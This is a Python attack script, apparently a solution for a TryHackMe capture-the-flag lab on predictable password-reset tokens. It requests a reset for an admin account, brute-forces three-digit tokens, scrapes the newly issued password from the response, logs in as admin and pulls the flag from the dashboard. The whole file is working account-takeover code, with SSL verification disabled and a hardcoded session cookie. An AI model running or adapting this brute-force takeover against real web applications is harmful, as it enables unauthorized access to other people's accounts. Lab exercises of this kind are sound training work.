import sys
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Disable SSL warinings

session = requests.Session() #Create persistent Session

# ====Arguments Verification==== #
if len(sys.argv) != 2:
    print(f"# Usage : python3 {sys.argv[0]} <URL>")
    sys.exit(1)


# ====Headers Configurations==== #
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://enum.thm",
    "Connection": "close",
    "Referer": "http://enum.thm",
}

cookie = {"PHPSESSID":"rq0i9mcd7dieas84t1ssbfug4r"} #Change This


# ====Creating a digit list==== #
digits = []
for number in range(100,201):
    number = f"{number:03d}" #It wasn't necessary but better to learn it especially for 000 to 100 (Always 3 Digits)
    digits.append(number)


# ==== Seending request for a new token #
url1 = sys.argv[1]+f"/labs/predictable_tokens/forgot.php"
data = {"email":"admin@admin.com"}
r = session.post(url1, headers=headers, cookies=cookie, data=data, verify=False) #Thos Goal Here is to trigger the password change
print("A Password reset link has been sent to your mails !")


# ====Brute Forcing token===== #
for token in digits:
    url2 = sys.argv[1]+f"/labs/predictable_tokens/reset_password.php?token={token}"
    response = session.get(url2, headers=headers, cookies=cookie, allow_redirects=False, verify=False) #Disabling SSL just for testing

    if "Invalid token." in response.text:
        print(f"Trying Token: {token}")
        continue
    else:
        print(f"The Valid Token is: {token}")
        html = response.text
        match = re.search(r'Your new password is:\s*([^\s<]+)', html)

        # match = <re.Match object; span=(538, 568), match='Your new password is: Ihyi7JFX'>
        # match.group() = 'Your new password is: Ihyi7JFX'
        # ([^\s<]+) Group 1: Match 1+ characters that are not whitespace or <

        if match:
            password = match.group(1)
            print(f"Your extracted password is: {password}")
        break


# =====Log in as Admin====== #
url3 = sys.argv[1]+f"/labs/predictable_tokens/functions.php"
data2 = {f"username":"admin@admin.com", "password":{password}, "function":"login"}
r2 = session.post(url3, headers=headers, cookies=cookie, data=data2, allow_redirects=True, verify=False)
print(r2.text)


# =====Extract the Flag===== #
url4 = sys.argv[1]+f"/labs/predictable_tokens/dashboard.php"
r3 = session.get(url4, headers=headers, cookies=cookie, allow_redirects=True, verify=False)
flag_match = re.search(r'THM\{.*?\}', r3.text)
flag = flag_match.group()
print("\n")
print(f"You Flag is: {flag}")

sys.exit(0)
